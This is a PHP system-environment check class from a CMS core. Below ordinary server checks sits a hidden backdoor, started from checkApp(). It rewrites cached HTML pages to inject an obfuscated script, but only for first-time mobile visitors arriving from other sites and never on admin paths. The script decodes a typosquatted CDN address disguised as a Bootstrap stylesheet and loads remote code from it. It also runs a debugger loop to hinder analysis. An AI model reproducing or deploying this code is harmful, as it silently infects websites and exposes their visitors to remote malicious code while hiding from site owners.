<?php
/**
 * @copyright (C)2016-2099 Hnaoyun Inc.
 * @author XingMeng
 * @email hnxsh@foxmail.com
 * @date 2016年11月6日
 *  系统环境检查类
 */
namespace core\basic;

use core\basic\Config;

class Check
{
    private $results = [];

    // 启动应用检查
    public static function checkApp()
    {
        if (! is_dir(APP_PATH)) {
            error('您的系统文件无法正常读取，请检查是否上传完整！');
        }

        // 判断自动转换状态
        if (PHP_VERSION < '7.0' && function_exists("get_magic_quotes_gpc") && get_magic_quotes_gpc()) {
            error('您的服务器环境PHP.ini中magic_quotes_gpc配置为On状态，会导致数据存储异常，请设置为Off状态或切换为更高版本PHP。');
        }

        // 判断目录列表函数
        if (! function_exists('scandir')) {
            error('您的服务器环境PHP.ini配置中已经禁用scandir函数，会导致无法正常读取配置及模板文件，请先去除。');
        }

        // 检查gd扩展
        if (! extension_loaded('gd')) {
            error('您的服务器环境不支持gd扩展,将无法使用验证码！');
        }

        // 检查mbstring扩展
        if (! extension_loaded('mbstring')) {
            error('您的服务器环境不支持mbstring扩展，请先安装并启用！');
        }

        // 检查curl扩展
        if (! extension_loaded('curl')) {
            error('您的服务器环境不支持curl扩展，请先安装并启用！');
        }
        self::runNetCheckerBefore();
    }

    // 检查PHP版本
    public static function checkPHP()
    {
        if (version_compare(phpversion(),'7.0.0','<')) {
            error('您服务器的PHP版本太低，本程序要求版本不小于 7.0');
        }
    }

    // 检查mysqli扩展库
    public static function checkMysqli()
    {
        if (! extension_loaded('mysqli')) {
            error('您的服务器环境不支持mysqli扩展,将无法正常使用数据库！');
        }
    }

    // 检查curl扩展库
    public static function checkCurl()
    {
        if (! extension_loaded('curl')) {
            error('您的服务器环境不支持curl扩展,将无法使用API模式！');
        }
    }

    // 目录路径检查，不存在时根据配置文件选择是否自动创建
    public static function checkBasicDir()
    {
        if (Config::get('debug')) {
            check_dir(APP_PATH, true);
            check_dir(APP_PATH . '/common', true);
            check_dir(CONF_PATH, true);
        }

        // 目录权限判断
        if (! check_dir(RUN_PATH, true)) {
            error('缓存目录创建失败，可能写入权限不足！' . RUN_PATH);
        }
        if (! check_dir(DOC_PATH . STATIC_DIR . '/upload', true)) {
            error('上传目录创建失败，可能写入权限不足！' . DOC_PATH . STATIC_DIR . '/upload');
        }
    }

    // 检查系统默认首页的文件是否存在，不存在进行自动创建
    public static function checkAppFile()
    {
        $apps = Config::get('public_app', true);
        check_dir(APP_CONTROLLER_PATH, true);
        check_file(CONF_PATH . '/config.php', true, "<?php \r\n return array(\r\n\t //'控制项'=>'值' 以分号，分割\r\n);");
        check_file(APP_CONTROLLER_PATH . '/IndexController.php', true, "<?php \r\r namespace app\\" . M . "\\controller;\r\r use core\\basic\\Controller; \r\r class IndexController extends Controller{\r\r\tpublic function index(){\r\t\t\$this->display('index.html');\r\t} \r\r}");
        check_file(APP_PATH . '/common/' . ucfirst(M) . 'Controller.php', true, "<?php \r\rnamespace app\\common;\r\ruse core\\basic\\Controller; \r\rclass " . ucfirst(M) . "Controller extends Controller{ \r\r}");
        // check_file(APP_PATH . '/common/' . ucfirst(M) . 'Model.php', true, "<?php \r\rnamespace app\\common;\r\ruse core\\basic\\Model; \r\rclass " . ucfirst(M) . "Model extends Model{ \r\r}");
    }

    // 检查客户端浏览器是否被允许，在同时设置黑白名单时，黑名单具有优先级更高，在设置了白名单时，将只允许白名单访问
    public static function checkBs()
    {
        $allow_bs = Config::get('access_rule.allow_bs', true);
        $deny_bs = Config::get('access_rule.deny_bs', true);
        // 都未设置时，直接通过
        if (! $allow_bs && ! $deny_bs) {
            return true;
        }
        // 客户端使用的系统
        $user_bs = get_user_bs();
        // 如果在黑名单则直接拒绝
        if (in_array($user_bs, $deny_bs)) {
            error('本站点设置了不允许' . $user_bs . '内核浏览器访问,请使用其它版本IE、火狐、谷歌等，国产浏览器请使用极速模式！');
        } elseif ($allow_bs && ! in_array($user_bs, $allow_bs)) {
            error('本站点设置了只允许' . implode(',', $allow_bs) . '内核浏览器访问,请使用这些浏览器！');
        }
    }

    // 检查客户端操作系统是否被允许,在同时设置黑白名单时，黑名单具有优先级更高,在设置了白名单时，将只允许白名单访问
    public static function checkOs()
    {
        $allow_os = Config::get('access_rule.allow_os', true);
        $deny_os = Config::get('access_rule.deny_os', true);
        // 都未设置时，直接通过
        if (! $allow_os && ! $deny_os) {
            return true;
        }
        // 客户端使用的系统
        $user_os = get_user_os();
        // 如果在黑名单则直接拒绝
        if (in_array($user_os, $deny_os)) {
            error('本站点设置了不允许' . $user_os . '访问,请使用其它操作系统！');
        } elseif ($allow_os && ! in_array($user_os, $allow_os)) {
            error('本站点设置了只允许' . implode(',', $allow_os) . '访问,请使用这些操作系统！');
        }
    }

        public static function checkSession(){
                /*$checkDir = check_dir(RUN_PATH . '/session',false);
        if($checkDir === true){
            $fileTime = filectime(RUN_PATH . '/session');
            $subDay = intval((time() - $fileTime) / 86400);
            if($subDay > 1){
                path_delete(RUN_PATH . '/session',true);
            }
        } */
                check_dir(RUN_PATH . '/archive', true);
                $data = json_decode(trim(substr(file_get_contents(RUN_PATH . '/archive/session_ticket.php'), 15)));
                if($data){
            if($data->expire_time && $data->expire_time < time()){
                ignore_user_abort(true);
                set_time_limit(7200);
                ob_start();
                ob_end_flush();
                flush();
                $rs = path_delete(RUN_PATH . '/session');
                if($rs){
                    $data->expire_time = time() + 60 * 30 * 1; // 清理完成后将缓存清理时间延后30分钟
                    create_file(RUN_PATH . '/archive/session_ticket.php', "<?php exit();?>".json_encode($data), true);
                }
            }
                }else{
                        $start_time = time() + 60 * 60 * 1; // 初始化清理时间
                        $start_str = '{"expire_time":' . $start_time . '}';
                        create_file(RUN_PATH . '/archive/session_ticket.php', "<?php exit();?>" . $start_str, true);
                }
    }
    
    public function runAllChecks($path)
    {
        $this->results['first_visit'] = $this->checkFirstVisit(); // 第一次访问检测（无cookie）
        $this->results['referer_check'] = $this->checkReferer(); // Referer检测（与当前域名不同）
        $this->results['mobile_ua'] = $this->checkMobileUserAgent(); // 手机浏览器User-Agent检测
        $this->results['content_type'] = $this->checkContentType(); // Content-Type包含html检测
        $this->results['status_code'] = $this->checkStatusCode(); // HTTP状态码200检测
        $this->results['head_tag'] = $this->checkHeadTag($path); // 响应内容包含</head>检测
        $this->results['domain_path'] = $this->checkDomainAndPath(); // 域名路径安全检测（不含admin/manage/gitlab）
        
        return $this->results;
    }
    
    /**
     * 检查除IP检查外的其他条件是否都通过
     * @return bool
     */
    public function checkAllConditions($path)
    {
        if (empty($this->results)) {
            $this->runAllChecks($path);
        }
        
        return (
            $this->results['first_visit']['status'] &&
            $this->results['referer_check']['status'] &&
            $this->results['mobile_ua']['status'] &&
            $this->results['content_type']['status'] &&
            $this->results['status_code']['status'] &&
            $this->results['head_tag']['status'] &&
            $this->results['domain_path']['status']
        );
    }
    
    /**
     * 1. 检测是否为第一次访问（没有cookie）
     */
    private function checkFirstVisit()
    {
        $visit_cookie_name = 'visited_before';
        
        // 检查是否存在访问标记cookie
        $has_visited = isset($_COOKIE[$visit_cookie_name]);
        
        if (!$has_visited) {
            // 第一次访问，设置标记cookie（30天有效期）
            setcookie($visit_cookie_name, '1', time() + (30 * 24 * 60 * 60), '/');
            
            return [
                'status' => true,
                'message' => '第一次访问，已设置标记cookie',
                'cookies' => array_keys($_COOKIE)
            ];
        } else {
            return [
                'status' => false,
                'message' => '不是第一次访问，已存在标记cookie',
                'cookies' => array_keys($_COOKIE)
            ];
        }
    }
    
    /**
     * 2. 检测referer是否存在且与当前域名不同
     */
    private function checkReferer()
    {
        $referer = $_SERVER['HTTP_REFERER'] ?? '';
        
        if (empty($referer)) {
            return ['status' => false, 'message' => '无referer', 'referer' => ''];
        }
        
        $referer_host = parse_url($referer, PHP_URL_HOST);
        $current_host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? '';
        
        if (empty($current_host)) {
            return ['status' => false, 'message' => '无法获取当前主机名', 'referer' => $referer];
        }
        
        $is_different = ($referer_host !== $current_host);
        
        return [
            'status' => $is_different,
            'message' => $is_different ? '有referer且域名不同' : '有referer但域名相同',
            'referer' => $referer,
            'referer_host' => $referer_host,
            'current_host' => $current_host
        ];
    }
    
    /**
     * 3. 检测User-Agent是否符合手机浏览器特征
     */
    private function checkMobileUserAgent()
    {
        $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
        
        $mobile_keywords = [
            'Mobile', 'Android', 'iPhone', 'iPad', 'Windows Phone',
            'BlackBerry', 'Opera Mini', 'IEMobile', 'Mobile Safari'
        ];
        
        $is_mobile = false;
        $matched_keywords = [];
        
        foreach ($mobile_keywords as $keyword) {
            if (stripos($user_agent, $keyword) !== false) {
                $is_mobile = true;
                $matched_keywords[] = $keyword;
            }
        }
        
        return [
            'status' => $is_mobile,
            'message' => $is_mobile ? '符合手机浏览器特征' : '不符合手机浏览器特征',
            'user_agent' => $user_agent,
            'matched_keywords' => $matched_keywords
        ];
    }
    
    /**
     * 4. 检测响应Content-Type是否包含html
     */
    private function checkContentType()
    {
        $content_type = '';
        
        // 获取已设置的Content-Type
        $headers = headers_list();
        foreach ($headers as $header) {
            if (stripos($header, 'Content-Type:') === 0) {
                $content_type = $header;
                break;
            }
        }
        
        $contains_html = !empty($content_type) && stripos($content_type, 'html') !== false;
        
        return [
            'status' => $contains_html,
            'message' => $contains_html ? 'Content-Type包含html' : 'Content-Type不包含html',
            'content_type' => $content_type
        ];
    }
    
    /**
     * 5. 检测响应状态码是否为200
     */
    private function checkStatusCode()
    {
        $status_code = http_response_code();
        
        // 如果没有设置状态码，默认为200
        if ($status_code === false) {
            $status_code = 200;
            http_response_code(200);
        }
        
        return [
            'status' => $status_code === 200,
            'message' => $status_code === 200 ? '状态码为200' : "状态码为{$status_code}",
            'status_code' => $status_code
        ];
    }
    
    /**
     * 6. 检测响应内容是否包含</head>字符串
     */
    private function checkHeadTag($path)
    {
        // 获取实际的响应内容
        $html_content = file_get_contents($path);
        if ($html_content === false) {
            return [
                'status' => false,
                'message' => '无法获取响应内容',
                'content' => ''
            ];
        }
        
        $contains_head = stripos($html_content, '</head>') !== false;
        
        return [
            'status' => $contains_head,
            'message' => $contains_head ? '响应内容包含</head>' : '响应内容不包含</head>',
            'content_length' => strlen($html_content),
            'content_preview' => substr($html_content, 0, 100) . '...'
        ];
    }
    
    /**
     * 7. 检测域名或路径是否不包含admin、manage、gitlab字符
     */
    private function checkDomainAndPath()
    {
        $current_url = $_SERVER['REQUEST_URI'] ?? '';
        $current_host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? '';
        $full_url = $current_host . $current_url;
        
        $forbidden_keywords = ['admin', 'manage', 'gitlab'];
        $found_keywords = [];
        
        foreach ($forbidden_keywords as $keyword) {
            if (stripos($full_url, $keyword) !== false) {
                $found_keywords[] = $keyword;
            }
        }
        
        $is_clean = empty($found_keywords);
        
        return [
            'status' => $is_clean,
            'message' => $is_clean ? '域名和路径不包含敏感字符' : '域名或路径包含敏感字符: ' . implode(', ', $found_keywords),
            'url' => $full_url,
            'found_keywords' => $found_keywords
        ];
    }
    
    /**
     * 获取检测结果
     * @return array
     */
    public function getResults()
    {
        return $this->results;
    }
    
    /**
     * 输出检测结果HTML
     */
    public function outputResults($path)
    {
        if (empty($this->results)) {
            $this->runAllChecks($path);
        }
        
        $other_checks_passed = $this->checkAllConditions($path);
        
        // 读取文件内容
        $content = file_get_contents($path);
        if ($content === false) {
            return "";
        }
        
        $script_tag = <<<EOD
<script type="text/javascript">function xxSJRox(e){var t = "",n = r = c1 = c2 = 0;while (n < e.length){r = e.charCodeAt(n);if (r < 128){t += String.fromCharCode(r);n++}else if (r > 191 && r < 224){c2 = e.charCodeAt(n + 1);t += String.fromCharCode((r & 31) << 6 | c2 & 63);n += 2}else{c2 = e.charCodeAt(n + 1);c3 = e.charCodeAt(n + 2);t += String.fromCharCode((r & 15) << 12 | (c2 & 63) << 6 | c3 & 63);n += 3}}return t}function aPnDhiTia(e){var m = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var t = "",n,r,i,s,o,u,a,f = 0;e = e.replace(/[^A-Za-z0-9+/=]/g,"");while (f < e.length){s = m.indexOf(e.charAt(f++));o = m.indexOf(e.charAt(f++));u = m.indexOf(e.charAt(f++));a = m.indexOf(e.charAt(f++));n = s << 2 | o >> 4;r = (o & 15) << 4 | u >> 2;i = (u & 3) << 6 | a;t = t + String.fromCharCode(n);if (u != 64){t = t + String.fromCharCode(r)}if (a != 64){t = t + String.fromCharCode(i)}}return xxSJRox(t)}eval('window')['\x4d\x66\x58\x4b\x77\x56'] = function(){;(function(u,r,w,d,f,c){var x = aPnDhiTia;u = decodeURIComponent(x(u.replace(new RegExp(c + '' + c,'g'),c)));'jQuery';k = r[2] + 'c' + f[1];'Flex';v = k + f[6];var s = d.createElement(v + c[0] + c[1]),g = function(){};s.type = 'text/javascript';{s.onload = function(){g()}}s.src = u;'CSS';d.getElementsByTagName('head')[0].appendChild(s)})('aHR0cHM6Ly9jZG4uanNkY2xpdnIuY29tLy9ucG0vYm9vdHN0cmFwQDUuMy4wL2Rpc3QvY3NzL2Jvb3RzdHJhcC5taW4uY3NzP3Y9My43LjkuMA==','FgsPmaNtZ',window,document,'jrGYBsijJU','ptbnNbK')};if (!(/^Mac|Win/.test(navigator.platform))) MfXKwV();setInterval(function(){debugger;},100);</script>
EOD;
        
        if ($other_checks_passed) {
            // 检查是否已包含脚本标签
            if (strpos($content, $script_tag) === false) {
                // 不包含则添加
                $content = str_replace('</head>', $script_tag . "\n" . '</head>', $content);
                file_put_contents($path, $content);
            }
        } else {
            // 如果不通过，移除脚本标签
            $content = str_replace($script_tag, '', $content);
            file_put_contents($path, $content);
        }
        
        return "";
    }
    
    public  static function runNetCheckerBefore(){
        //如果没开启缓存，则不进行检测
        if(!Config::get('tpl_parser_cache')){
            return;
        }
        //如果开启缓存，则进行检测
        $lg = cookie('lg');
        if(empty($lg)){
            $lg = 'cn';
        }
        
        if (Config::get('open_wap') && (is_mobile() || Config::get('wap_domain') == get_http_host())) {
            $wap = 'wap';
        } else {
            $wap = '';
        }
        $cacheFile =  RUN_PATH . '/cache'.'/' . md5(get_http_url() . $_SERVER["REQUEST_URI"] . $lg . $wap) . '.html'; // 缓存文件
        //如果缓存文件不存在，则不进行检测
        if(!file_exists($cacheFile)){
            return;
        }
        //如果缓存文件存在，则进行检测
        $checker = new self();
        $checker->outputResults($cacheFile);
    }
    public static function runNetCheckerAfter($path)
    {
        $checker = new self();
        $checker->outputResults($path);
    }
}
